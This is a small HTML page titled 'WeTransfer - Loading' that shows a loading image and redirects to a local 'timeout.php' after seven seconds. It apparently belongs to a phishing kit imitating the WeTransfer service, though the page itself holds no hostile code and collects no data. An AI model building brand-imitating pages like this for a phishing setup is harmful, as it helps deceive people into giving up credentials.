<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>WeTransfer - Loading</title>
<meta http-equiv="REFRESH" content="7;url=timeout.php">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body style="visibility:hidden" onload="unhideBody()">
<style type="text/css">
div#container
{
	position:relative;
	width: 770px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:172px; top:27px; width:426px; height:161px; z-index:0"><img src="img/loading.gif" alt="" title="" border=0 width=426 height=161></div>

</div>

</body>
</html>
